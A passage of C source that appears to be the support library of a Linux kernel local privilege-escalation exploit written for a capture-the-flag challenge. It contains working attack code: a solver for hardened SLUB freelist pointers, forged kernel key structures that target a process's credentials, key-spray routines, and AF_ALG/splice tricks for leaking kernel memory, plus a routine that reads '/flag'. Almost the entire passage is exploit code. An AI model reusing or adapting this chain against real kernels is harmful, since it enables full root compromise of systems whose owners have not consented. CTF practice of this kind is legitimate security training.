#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/if_alg.h>
#include <linux/keyctl.h>
#include <linux/membarrier.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "target_hardened.h"

/*
 * Support library for the capture stages.  It is compiled into the same
 * binary as the chain (main is renamed and re-entered through the dispatcher),
 * so the probed k2l layout and the retired-payload hand-off are shared without
 * a second process.
 */

typedef int32_t key_serial_t;

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

struct freelist_solution {
    uint64_t base;
    uint64_t random;
    int terminal;
    int next[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
};

struct fake_spec {
    uint64_t cred;
    uint64_t type;
    uint64_t domain_tag;
    uint64_t description;
    uint64_t hash;
    uint64_t x;
};

static unsigned long long read_cap_eff(void);
static int try_flag(void);

static uint64_t bswap64_u(uint64_t x)
{
    return __builtin_bswap64(x);
}

static uint64_t encode_freeptr(uint64_t next, uint64_t random, uint64_t address)
{
    return next ^ random ^ bswap64_u(address);
}

static uint64_t decode_freeptr(uint64_t encoded, uint64_t random,
                               uint64_t address)
{
    return encoded ^ random ^ bswap64_u(address);
}

static int validate_chain(const uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB],
                          uint64_t base, uint64_t random,
                          struct freelist_solution *out)
{
    int indeg[H_USER_PAYLOAD_OBJECTS_PER_SLAB] = {0};
    int terminal = -1, head = -1, seen = 0, i;
    bool visited[H_USER_PAYLOAD_OBJECTS_PER_SLAB] = {false};

    if ((base & 0xfff) != 0 || !k2_is_slab_pointer(base))
        return -EINVAL;
    for (i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++) {
        uint64_t object = base + (uint64_t)i * H_USER_PAYLOAD_BUCKET;
        uint64_t address = object + H_USER_PAYLOAD_FREEPTR;
        uint64_t next = decode_freeptr(enc[i], random, address);

        if (!next) {
            if (terminal >= 0)
                return -EINVAL;
            terminal = i;
            out->next[i] = -1;
            continue;
        }
        if (next < base || next >= base + 0x1000 ||
            ((next - base) % H_USER_PAYLOAD_BUCKET) != 0)
            return -EINVAL;
        out->next[i] = (int)((next - base) / H_USER_PAYLOAD_BUCKET);
        if (++indeg[out->next[i]] != 1)
            return -EINVAL;
    }
    if (terminal < 0)
        return -EINVAL;
    for (i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        if (indeg[i] == 0) {
            if (head >= 0)
                return -EINVAL;
            head = i;
        }
    if (head < 0)
        return -EINVAL;
    for (i = head; i >= 0; i = out->next[i]) {
        if (visited[i])
            return -EINVAL;
        visited[i] = true;
        seen++;
    }
    if (seen != H_USER_PAYLOAD_OBJECTS_PER_SLAB)
        return -EINVAL;
    out->base = base;
    out->random = random;
    out->terminal = terminal;
    return 0;
}

static int solve_freelist(const uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB],
                          struct freelist_solution *solution)
{
    struct freelist_solution candidate;
    int found = 0, t, i, n;

    for (t = 0; t < H_USER_PAYLOAD_OBJECTS_PER_SLAB; t++) {
        uint64_t ot = (uint64_t)t * H_USER_PAYLOAD_BUCKET +
                      H_USER_PAYLOAD_FREEPTR;
        for (i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++) {
            uint64_t oi, x, base, random;

            if (i == t)
                continue;
            oi = (uint64_t)i * H_USER_PAYLOAD_BUCKET +
                 H_USER_PAYLOAD_FREEPTR;
            for (n = 0; n < H_USER_PAYLOAD_OBJECTS_PER_SLAB; n++) {
                x = enc[i] ^ enc[t] ^ bswap64_u(oi) ^ bswap64_u(ot);
                if ((x & 0xfff) != (uint64_t)n * H_USER_PAYLOAD_BUCKET)
                    continue;
                base = x & ~UINT64_C(0xfff);
                random = enc[t] ^ bswap64_u(base + ot);
                memset(&candidate, 0, sizeof(candidate));
                if (validate_chain(enc, base, random, &candidate) != 0)
                    continue;
                if (!found) {
                    *solution = candidate;
                    found = 1;
                } else if (solution->base != candidate.base ||
                           solution->random != candidate.random) {
                    return -EEXIST;
                }
            }
        }
    }
    return found ? 0 : -ENOENT;
}

static void make_synthetic_freelist(uint64_t base, uint64_t random,
                                    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB])
{
    static const int order[H_USER_PAYLOAD_OBJECTS_PER_SLAB] =
        {7, 2, 14, 1, 9, 4, 12, 0, 15, 5, 10, 3, 13, 6, 11, 8};
    int next[H_USER_PAYLOAD_OBJECTS_PER_SLAB];

    for (int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        next[i] = -2;
    for (int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB - 1; i++)
        next[order[i]] = order[i + 1];
    next[order[H_USER_PAYLOAD_OBJECTS_PER_SLAB - 1]] = -1;
    for (int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++) {
        uint64_t object = base + (uint64_t)i * H_USER_PAYLOAD_BUCKET;
        uint64_t fp = next[i] < 0 ? 0 :
            base + (uint64_t)next[i] * H_USER_PAYLOAD_BUCKET;

        enc[i] = encode_freeptr(fp, random,
                                object + H_USER_PAYLOAD_FREEPTR);
    }
}

static void put_u16(unsigned char *p, uint16_t v) { memcpy(p, &v, sizeof(v)); }
static void put_u32(unsigned char *p, uint32_t v) { memcpy(p, &v, sizeof(v)); }
static void put_u64(unsigned char *p, uint64_t v) { memcpy(p, &v, sizeof(v)); }
static uint16_t get_u16(const unsigned char *p) { uint16_t v; memcpy(&v, p, 2); return v; }
static uint32_t get_u32(const unsigned char *p) { uint32_t v; memcpy(&v, p, 4); return v; }
static uint64_t get_u64(const unsigned char *p) { uint64_t v; memcpy(&v, p, 8); return v; }

static void build_direct_fake(unsigned char out[H_DIRECT_FAKE_BYTES],
                              const struct fake_spec *spec,
                              uint64_t fake_address)
{
    memset(out, 0x11, H_DIRECT_FAKE_BYTES);
    put_u32(out + H_KEY_USAGE, 1);
    if (H_KEY_SERIAL)
        put_u32(out + H_KEY_SERIAL, 0x41414141);
    put_u64(out + H_KEY_USER, spec->cred);
    put_u64(out + H_KEY_EXPIRY, UINT64_C(0x7fffffffffffffff));
    put_u64(out + H_KEY_LAST_USED, H_FAKE_MARKER_SENTINEL);
    put_u32(out + H_KEY_UID, 0x01010101);
    put_u32(out + H_KEY_GID, 0x01010101);
    put_u32(out + H_KEY_PERM, 0x01010100 | H_KEY_OTH_SEARCH | H_KEY_OTH_LINK);
    put_u16(out + H_KEY_QUOTALEN, 1);
    put_u16(out + H_KEY_DESC_LEN, 1);
    put_u16(out + H_KEY_STATE, 1);
    put_u64(out + H_KEY_FLAGS,
            (UINT64_C(1) << H_KEY_FLAG_IN_QUOTA) |
            (UINT64_C(1) << H_KEY_FLAG_USER_ALIVE));
    if (H_KEY_HASH)
        put_u64(out + H_KEY_HASH, spec->hash);
    if (H_KEY_X)
        put_u64(out + H_KEY_X, spec->x);
    put_u64(out + H_KEY_TYPE, spec->type);
    put_u64(out + H_KEY_DOMAIN_TAG, spec->domain_tag);
    put_u64(out + H_KEY_DESCRIPTION, spec->description);
    if (H_KEY_KEYS_ROOT)
        put_u64(out + H_KEY_KEYS_ROOT, 0);
    put_u64(out + k2l.node_slots + k2l.fake_slot * 8, fake_address);
}

static long add_key_raw(const char *type, const char *desc, const void *payload,
                        size_t plen, key_serial_t ring)
{
    return syscall(SYS_add_key, type, desc, payload, plen, ring);
}

static long keyctl_raw(unsigned long cmd, unsigned long a2, unsigned long a3,
                       unsigned long a4, unsigned long a5)
{
    return syscall(SYS_keyctl, cmd, a2, a3, a4, a5);
}

static int create_carrier(key_serial_t ring, unsigned int id,
                          const unsigned char fake[H_DIRECT_FAKE_BYTES])
{
    static atomic_ullong nonce = 1;
    char desc[64];
    unsigned long long n = atomic_fetch_add_explicit(&nonce, 1,
                                                      memory_order_relaxed);
    long ret;

    snprintf(desc, sizeof(desc), "k2-carrier-%d-%llu-%u", getpid(), n, id);
    ret = add_key_raw("user", desc, fake, H_DIRECT_FAKE_BYTES, ring);
    return ret < 0 ? -errno : (int)ret;
}

static int update_carrier(key_serial_t serial,
                          const unsigned char fake[H_DIRECT_FAKE_BYTES])
{
    long ret = keyctl_raw(KEYCTL_UPDATE, (unsigned long)serial,
                          (unsigned long)fake, H_DIRECT_FAKE_BYTES, 0);

    return ret < 0 ? -errno : 0;
}

static int create_keyring(const char *role, key_serial_t parent)
{
    static atomic_ullong nonce = 1;
    char desc[64];
    unsigned long long n = atomic_fetch_add_explicit(&nonce, 1,
                                                      memory_order_relaxed);
    long ret;

    snprintf(desc, sizeof(desc), "k2-%s-%d-%llu", role, getpid(), n);
    ret = add_key_raw("keyring", desc, NULL, 0, parent);
    return ret < 0 ? -errno : (int)ret;
}

static int spray_carriers(key_serial_t ring, size_t count,
                          const unsigned char fake[H_DIRECT_FAKE_BYTES],
                          key_serial_t *serials)
{
    for (size_t i = 0; i < count; i++) {
        int serial = create_carrier(ring, (unsigned int)i, fake);

        if (serial < 0)
            return serial;
        if (serials)
            serials[i] = serial;
    }
    return 0;
}

static int global_rcu_gp(void)
{
    long ret = syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0);

    return ret < 0 ? -errno : 0;
}

#define MAX_GAP_ROUNDS 128

struct gap_plan {
    size_t rounds[MAX_GAP_ROUNDS];
    size_t count;
    size_t excess;
    size_t final_len;
    size_t request_len;
    size_t expected_return;
};

struct feed_args {
    int fd;
    const struct gap_plan *plan;
    useconds_t delay;
    int error;
};

/* When nonnegative, duplicate every AF_ALG result into this pipe before
 * reading the source pipe so a miss cannot recycle the page immediately. */
static int afalg_quarantine_write_fd = -1;

/* Callback after AF_ALG setup, before the receive feed and splice. */
static int (*afalg_pre_splice_hook)(void *argument);
static void *afalg_pre_splice_argument;

static int plan_add_round(struct gap_plan *plan, size_t round)
{
    if (!round || round % 16 || plan->count == MAX_GAP_ROUNDS)
        return -EINVAL;
    plan->rounds[plan->count++] = round;
    return 0;
}

static int build_target_plan(const size_t *targets, size_t target_count,
                             size_t publish_len, struct gap_plan *plan)
{
    size_t destination = 0, returned = 0, final_output, i;
    int rc;

    memset(plan, 0, sizeof(*plan));
    plan->excess = 8;
    plan->final_len = 8;
    final_output = plan->excess + plan->final_len;
    if (!target_count || publish_len < 32 || publish_len % 16)
        return -EINVAL;
    for (i = 0; i < target_count; i++) {
        size_t delta;

        if (targets[i] < destination || targets[i] + 8 > publish_len ||
            (i && targets[i] <= targets[i - 1]))
            return -EINVAL;
        delta = targets[i] - destination;
        if (delta % 16) {
            if (delta < 24 || delta % 16 != 8)
                return -EINVAL;
            rc = plan_add_round(plan, 16);
            if (rc)
                return rc;
            destination += 16 + plan->excess;
            returned += 16;
            delta = targets[i] - destination;
        }
        rc = plan_add_round(plan, delta);
        if (rc)
            return rc;
        destination += delta + plan->excess;
        returned += delta;
        if (destination != targets[i] + plan->excess)
            return -ERANGE;
    }
    if (returned >= publish_len - final_output)
        return -E2BIG;
    rc = plan_add_round(plan, publish_len - final_output - returned);
    if (rc)
        return rc;
    destination += plan->rounds[plan->count - 1] + plan->excess;
    returned += plan->rounds[plan->count - 1];
    plan->request_len = destination + final_output;
    plan->expected_return = returned + final_output;
    return plan->expected_return == publish_len ? 0 : -ERANGE;
}

static int build_single_plan(size_t gap_start, size_t excess,
                             struct gap_plan *plan)
{
    if (!gap_start || gap_start % 16 || !excess || excess >= 16)
        return -EINVAL;
    memset(plan, 0, sizeof(*plan));
    plan->rounds[0] = gap_start;
    plan->count = 1;
    plan->excess = excess;
    plan->final_len = 16 - excess;
    plan->request_len = gap_start + excess + 16;
    plan->expected_return = gap_start + 16;
    return 0;
}

static bool plan_has_gap(const struct gap_plan *plan, size_t target)
{
    size_t destination = 0, i;

    for (i = 0; i < plan->count; i++) {
        size_t gap = destination + plan->rounds[i];

        if (target >= gap && target + 8 <= gap + plan->excess)
            return true;
        destination = gap + plan->excess;
    }
    return false;
}

static void *feed_rounds(void *argp)
{
    struct feed_args *arg = argp;
    const struct gap_plan *plan = arg->plan;
    unsigned char *data;
    size_t max = plan->final_len, i;

    for (i = 1; i < plan->count; i++)
        if (plan->rounds[i] > max)
            max = plan->rounds[i];
    data = calloc(1, max);
    if (!data) {
        arg->error = -ENOMEM;
        return NULL;
    }
    pthread_cleanup_push(free, data);
    for (i = 1; i < plan->count; i++) {
        ssize_t n;

        usleep(arg->delay);
        n = send(arg->fd, data, plan->rounds[i], MSG_MORE);
        if (n != (ssize_t)plan->rounds[i]) {
            arg->error = errno ? -errno : -EIO;
            goto out;
        }
    }
    usleep(arg->delay);
    if (send(arg->fd, data, plan->final_len, 0) !=
        (ssize_t)plan->final_len)
        arg->error = errno ? -errno : -EIO;
out:
    pthread_cleanup_pop(1);
    return NULL;
}

/* af_alg_wait_for_data() ignores socket timeouts, so interrupt the splicing
 * thread with a non-restarting signal instead. */
#define AFALG_ATTEMPT_TIMEOUT_USEC 2000000U

struct afalg_attempt_timer {
    pthread_t target;
    useconds_t timeout_usec;
    atomic_bool disarmed;
    atomic_bool fired;
};

static pthread_once_t afalg_timeout_signal_once = PTHREAD_ONCE_INIT;

static void afalg_timeout_signal_handler(int signal_number)
{
    (void)signal_number;
}

static void afalg_install_timeout_signal(void)
{
    struct sigaction action = {0};

    action.sa_handler = afalg_timeout_signal_handler;
    sigemptyset(&action.sa_mask);
    /* Deliberately omit SA_RESTART: the signal must break splice(). */
    (void)sigaction(SIGUSR2, &action, NULL);
}

static void *afalg_attempt_timer_worker(void *opaque)
{
    struct afalg_attempt_timer *timer = opaque;
    struct timespec delay = {
        .tv_sec = timer->timeout_usec / 1000000U,
        .tv_nsec = (long)(timer->timeout_usec % 1000000U) * 1000L,
    };

    while (nanosleep(&delay, &delay) < 0 && errno == EINTR)
        ;
    if (!atomic_load_explicit(&timer->disarmed, memory_order_acquire)) {
        atomic_store_explicit(&timer->fired, true, memory_order_release);
        (void)pthread_kill(timer->target, SIGUSR2);
    }
    return NULL;
}

static int afalg_plan_record(const struct gap_plan *plan, useconds_t delay,
                             unsigned char **record, size_t *record_len)
{
    struct sockaddr_alg sa = {.salg_family = AF_ALG};
    unsigned char key[64], iv[16] = {0};
    unsigned char *first = NULL, *out = NULL;
    char control[CMSG_SPACE(sizeof(uint32_t)) +
                 CMSG_SPACE(sizeof(struct af_alg_iv) + 16)];
    struct msghdr msg = {0};
    struct iovec iov;
    struct cmsghdr *cmsg;
    struct af_alg_iv *aiv;
    struct feed_args feed = {0};
    pthread_t th, timer_thread;
    struct afalg_attempt_timer timer = {
        .timeout_usec = AFALG_ATTEMPT_TIMEOUT_USEC,
    };
    int tfm = -1, op = -1, pfd[2] = {-1, -1}, rc = -1;
    size_t first_len;
    ssize_t n, spliced, got = 0;
    int thread_rc, timer_rc, splice_errno = 0;
    bool feed_started = false, timer_started = false;

    if (!plan || !plan->count || !plan->request_len ||
        plan->request_len > (1U << 20))
        return -EINVAL;
    *record = NULL;
    *record_len = 0;
    first_len = plan->rounds[0] + plan->excess;
    for (size_t i = 0; i < sizeof(key); i++)
        key[i] = (unsigned char)(i + 1);
    memcpy(sa.salg_type, "skcipher", 9);
    memcpy(sa.salg_name, "xts(aes)", 9);
    tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfm < 0) { rc = -errno; goto out; }
    if (bind(tfm, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
        setsockopt(tfm, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
        rc = -errno; goto out;
    }
    op = accept(tfm, NULL, NULL);
    if (op < 0) { rc = -errno; goto out; }
    if (pipe(pfd) < 0) { rc = -errno; goto out; }
    first = calloc(1, first_len);
    out = malloc(plan->request_len);
    if (!first || !out) { rc = -ENOMEM; goto out; }
    memset(out, 0xa5, plan->request_len);
    memset(control, 0, sizeof(control));
    iov.iov_base = first; iov.iov_len = first_len;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = control; msg.msg_controllen = sizeof(control);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_ENCRYPT;
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
    aiv = (struct af_alg_iv *)CMSG_DATA(cmsg);
    aiv->ivlen = sizeof(iv); memcpy(aiv->iv, iv, sizeof(iv));
    n = sendmsg(op, &msg, MSG_MORE);
    if (n != (ssize_t)first_len) { rc = errno ? -errno : -EIO; goto out; }
    feed = (struct feed_args){.fd = op, .plan = plan, .delay = delay};
    if (afalg_pre_splice_hook) {
        rc = afalg_pre_splice_hook(afalg_pre_splice_argument);
        if (rc)
            goto out;
    }
    thread_rc = pthread_create(&th, NULL, feed_rounds, &feed);
    if (thread_rc != 0) {
        rc = -thread_rc; goto out;
    }
    feed_started = true;
    (void)pthread_once(&afalg_timeout_signal_once,
                       afalg_install_timeout_signal);
    timer.target = pthread_self();
    timer_rc = pthread_create(&timer_thread, NULL,
                              afalg_attempt_timer_worker, &timer);
    if (timer_rc != 0) {
        rc = -timer_rc;
        (void)pthread_cancel(th);
        pthread_join(th, NULL);
        feed_started = false;
        goto out;
    }
    timer_started = true;
    spliced = splice(op, NULL, pfd[1], NULL, plan->request_len, 0);
    splice_errno = errno;
    atomic_store_explicit(&timer.disarmed, true, memory_order_release);
    if (!atomic_load_explicit(&timer.fired, memory_order_acquire))
        (void)pthread_cancel(timer_thread);
    pthread_join(timer_thread, NULL);
    timer_started = false;
    if (atomic_load_explicit(&timer.fired, memory_order_acquire)) {
        (void)pthread_cancel(th);
        pthread_join(th, NULL);
        feed_started = false;
        rc = -ETIMEDOUT;
        goto out;
    }
    if (spliced <= 0) {
        (void)pthread_cancel(th);
        pthread_join(th, NULL);
        feed_started = false;
        rc = spliced < 0 ? -splice_errno : -EIO;
        goto out;
    }
    pthread_join(th, NULL);
    feed_started = false;
    if (feed.error) { rc = feed.error; goto out; }
    if (afalg_quarantine_write_fd >= 0) {
        ssize_t held = tee(pfd[0], afalg_quarantine_write_fd,
                           (size_t)spliced, SPLICE_F_NONBLOCK);

        if (held != spliced) {
            rc = held < 0 ? -errno : -ENOSPC;
            goto out;
        }
    }
    while (got < spliced) {
        n = read(pfd[0], out + got, (size_t)(spliced - got));
        if (n <= 0) { rc = n < 0 ? -errno : -EIO; goto out; }
        got += (size_t)n;
    }
    *record = out; *record_len = (size_t)spliced; out = NULL; rc = 0;
out:
    if (timer_started) {
        atomic_store_explicit(&timer.disarmed, true, memory_order_release);
        (void)pthread_cancel(timer_thread);
        pthread_join(timer_thread, NULL);
    }
    if (feed_started) {
        (void)pthread_cancel(th);
        pthread_join(th, NULL);
    }
    free(first); free(out);
    if (pfd[0] >= 0) close(pfd[0]);
    if (pfd[1] >= 0) close(pfd[1]);
    if (op >= 0) close(op);
    if (tfm >= 0) close(tfm);
    return rc;
}

/* Seeded-iterator variant used by the public geometry controls: the skipped
 * bytes must still carry the caller's unique seed. */
static int afalg_plan_user_record(const struct gap_plan *plan, useconds_t delay,
                                  const unsigned char *seed, size_t seed_len,
                                  unsigned char **record, size_t *record_len,
                                  ssize_t *reported)
{
    struct sockaddr_alg sa = {.salg_family = AF_ALG};
    unsigned char key[64], iv[16] = {0};
    unsigned char *first = NULL, *out = NULL;
    char control[CMSG_SPACE(sizeof(uint32_t)) +
                 CMSG_SPACE(sizeof(struct af_alg_iv) + 16)];
    struct msghdr msg = {0};
    struct iovec iov;
    struct cmsghdr *cmsg;
    struct af_alg_iv *aiv;
    struct feed_args feed = {0};
    pthread_t th;
    int tfm = -1, op = -1, rc = -1;
    size_t first_len;
    ssize_t n;
    int thread_rc;

    if (!plan || !plan->count || !plan->request_len ||
        plan->request_len > (1U << 20) || !seed ||
        seed_len < plan->request_len)
        return -EINVAL;
    *record = NULL;
    *record_len = 0;
    *reported = -1;
    first_len = plan->rounds[0] + plan->excess;
    for (size_t i = 0; i < sizeof(key); i++)
        key[i] = (unsigned char)(i + 1);
    memcpy(sa.salg_type, "skcipher", 9);
    memcpy(sa.salg_name, "xts(aes)", 9);
    tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (tfm < 0) { rc = -errno; goto out; }
    if (bind(tfm, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
        setsockopt(tfm, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) < 0) {
        rc = -errno; goto out;
    }
    op = accept(tfm, NULL, NULL);
    if (op < 0) { rc = -errno; goto out; }
    first = calloc(1, first_len);
    out = malloc(plan->request_len);
    if (!first || !out) { rc = -ENOMEM; goto out; }
    memcpy(out, seed, plan->request_len);
    memset(control, 0, sizeof(control));
    iov.iov_base = first; iov.iov_len = first_len;
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = control; msg.msg_controllen = sizeof(control);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_ENCRYPT;
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + sizeof(iv));
    aiv = (struct af_alg_iv *)CMSG_DATA(cmsg);
    aiv->ivlen = sizeof(iv); memcpy(aiv->iv, iv, sizeof(iv));
    n = sendmsg(op, &msg, MSG_MORE);
    if (n != (ssize_t)first_len) { rc = errno ? -errno : -EIO; goto out; }
    feed = (struct feed_args){.fd = op, .plan = plan, .delay = delay};
    thread_rc = pthread_create(&th, NULL, feed_rounds, &feed);
    if (thread_rc != 0) { rc = -thread_rc; goto out; }
    n = recv(op, out, plan->request_len, 0);
    pthread_join(th, NULL);
    if (feed.error) { rc = feed.error; goto out; }
    if (n <= 0) { rc = n < 0 ? -errno : -EIO; goto out; }
    *reported = n;
    *record = out;
    *record_len = plan->request_len;
    out = NULL;
    rc = 0;
out:
    free(first);
    free(out);
    if (op >= 0) close(op);
    if (tfm >= 0) close(tfm);
    return rc;
}

static int afalg_gap_record(size_t gap_start, size_t excess, useconds_t delay,
                            unsigned char **record, size_t *record_len)
{
    struct gap_plan plan;
    int rc = build_single_plan(gap_start, excess, &plan);

    return rc ? rc : afalg_plan_record(&plan, delay, record, record_len);
}

static int read_page_file(const char *path, unsigned char page[4096])
{
    int fd = open(path, O_RDONLY);
    ssize_t got = 0;

    if (fd < 0)
        return -errno;
    while (got < 4096) {
        ssize_t n = read(fd, page + got, 4096 - (size_t)got);

        if (n <= 0) {
            close(fd);
            return n < 0 ? -errno : -EMSGSIZE;
        }
        got += n;
    }
    close(fd);
    return 0;
}

static int read_exact_file(const char *path, void *buffer, size_t length)
{
    unsigned char *p = buffer;
    size_t got = 0;
    int fd = open(path, O_RDONLY);

    if (fd < 0)
        return -errno;
    while (got < length) {
        ssize_t n = read(fd, p + got, length - got);

        if (n <= 0) {
            int rc = n < 0 ? -errno : -EMSGSIZE;

            close(fd);
            return rc;
        }
        got += (size_t)n;
    }
    close(fd);
    return 0;
}

static int write_exact_file(const char *path, const void *buffer,
                            size_t length)
{
    const unsigned char *p = buffer;
    size_t done = 0;
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);

    if (fd < 0)
        return -errno;
    while (done < length) {
        ssize_t n = write(fd, p + done, length - done);

        if (n <= 0) {
            int rc = n < 0 ? -errno : -EIO;

            close(fd);
            return rc;
        }
        done += (size_t)n;
    }
    if (close(fd) < 0)
        return -errno;
    return 0;
}

static int build_payload_freelist_plan(struct gap_plan *plan)
{
    size_t targets[H_USER_PAYLOAD_OBJECTS_PER_SLAB];

    for (size_t i = 0; i < ARRAY_SIZE(targets); i++)
        targets[i] = i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR;
    return build_target_plan(targets, ARRAY_SIZE(targets), 4096, plan);
}

static int build_filp_cred_plan(struct gap_plan *plan)
{
    size_t targets[H_FILES_MAX];
    size_t count = k2l.files_per_slab;

    for (size_t i = 0; i < count; i++)
        targets[i] = i * H_FILE_STRIDE + H_FILE_CRED;
    return build_target_plan(targets, count, 4096, plan);
}

static int scan_filp_cred(const unsigned char page[4096], uint64_t *best,
                          unsigned int *hits)
{
    uint64_t values[H_FILES_MAX];
    unsigned int counts[H_FILES_MAX] = {0};
    unsigned int i, j, max = 0;
    uint64_t candidate = 0;
    unsigned int count = k2l.files_per_slab;

    for (i = 0; i < count; i++)
        values[i] = get_u64(page + i * H_FILE_STRIDE + H_FILE_CRED);
    for (i = 0; i < count; i++) {
        if (!k2_is_slab_pointer(values[i]))
            continue;
        for (j = 0; j < count; j++)
            counts[i] += values[j] == values[i];
        if (counts[i] > max) {
            max = counts[i];
            candidate = values[i];
        }
    }
    if (max < 4)
        return -ENOENT;
    *best = candidate;
    *hits = max;
    return 0;
}

static void extract_freelist_words(const unsigned char page[4096],
                                   uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB])
{
    for (int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        enc[i] = get_u64(page + i * H_USER_PAYLOAD_BUCKET +
                         H_USER_PAYLOAD_FREEPTR);
}

static int make_trainer_page(const char *path)
{
    const uint64_t base = UINT64_C(0xffff9e8d4011b000);
    const uint64_t random = UINT64_C(0x6d3173f9ac842b10);
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    unsigned char page[4096];

    memset(page, 0xa6, sizeof(page));
    make_synthetic_freelist(base, random, enc);
    for (int i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        put_u64(page + i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR,
                enc[i]);
    return write_exact_file(path, page, sizeof(page));
}

static int pin_current_thread(int cpu)
{
    cpu_set_t set;

    if (cpu < 0)
        return 0;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set) < 0 ? -errno : 0;
}

static unsigned long long read_cap_eff(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    char line[256];
    unsigned long long cap = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
        if (sscanf(line, "CapEff:%llx", &cap) == 1)
            break;
    fclose(f);
    return cap;
}

static int try_flag(void)
{
    char buf[256];
    int fd = open("/flag", O_RDONLY), saved;
    ssize_t n;

    if (fd < 0)
        return -errno;
    n = read(fd, buf, sizeof(buf) - 1);
    saved = errno;
    close(fd);
    if (n < 0)
        return -saved;
    buf[n] = 0;
    printf("FLAG_READ %s\n", buf);
    return 0;
}

static int selftest(void)
{
#define SELFTEST_CHECK(condition, label) do { \
    if (!(condition)) { \
        fprintf(stderr, "SELFTEST_FAIL %s\n", label); \
        return 1; \
    } \
} while (0)
    const uint64_t base = UINT64_C(0xffff9e8d4011b000);
    const uint64_t random = UINT64_C(0x6d3173f9ac842b10);
    const uint64_t cred = UINT64_C(0xffff9e8d40112280);
    uint64_t enc[H_USER_PAYLOAD_OBJECTS_PER_SLAB];
    struct freelist_solution sol;
    struct fake_spec spec;
    unsigned char fake[H_DIRECT_FAKE_BYTES], page[4096] = {0};
    struct gap_plan payload_plan, filp_plan;
    uint64_t scanned;
    unsigned int hits, i;

    if (k2_layout_probe() != 0)
        return 1;
    if (k2_layout_finish(base) != 0 || k2_layout_selftest() != 0)
        return 1;
    k2l.freeptr = 128;
    make_synthetic_freelist(base, random, enc);
    SELFTEST_CHECK(solve_freelist(enc, &sol) == 0 && sol.base == base &&
                   sol.random == random, "freelist_solver");
    spec = (struct fake_spec){
        .cred = (cred + k2l.cred_cap_effective) - k2l.ku_qnbytes,
        .type = UINT64_C(0xffffffff84ad5ea0),
        .domain_tag = UINT64_C(0xffffffff84ad57b8),
        .description = UINT64_C(0xffff9e8d4011b318) + k2l.desc_off,
        .hash = UINT64_C(0x1122334455667789),
        .x = UINT64_C(0x5151515151510101),
    };
    build_direct_fake(fake, &spec, UINT64_C(0xffff9e8d4011b318));
    SELFTEST_CHECK(get_u32(fake + H_KEY_USAGE) == 1, "fake_usage");
    SELFTEST_CHECK(get_u64(fake + H_KEY_USER) + k2l.ku_qnbytes ==
                   cred + k2l.cred_cap_effective, "quota_overlap");
    SELFTEST_CHECK(get_u64(fake + k2l.node_slots + k2l.fake_slot * 8) ==
                   UINT64_C(0xffff9e8d4011b318), "fake_node_leaf");
    SELFTEST_CHECK(build_payload_freelist_plan(&payload_plan) == 0,
                   "payload_gap_plan");
    for (i = 0; i < H_USER_PAYLOAD_OBJECTS_PER_SLAB; i++)
        SELFTEST_CHECK(plan_has_gap(&payload_plan,
                       i * H_USER_PAYLOAD_BUCKET + H_USER_PAYLOAD_FREEPTR),
                       "payload_target_gap");
    SELFTEST_CHECK(build_filp_cred_plan(&filp_plan) == 0, "filp_gap_plan");
    for (i = 0; i < k2l.files_per_slab; i++)
        SELFTEST_CHECK(plan_has_gap(&filp_plan,
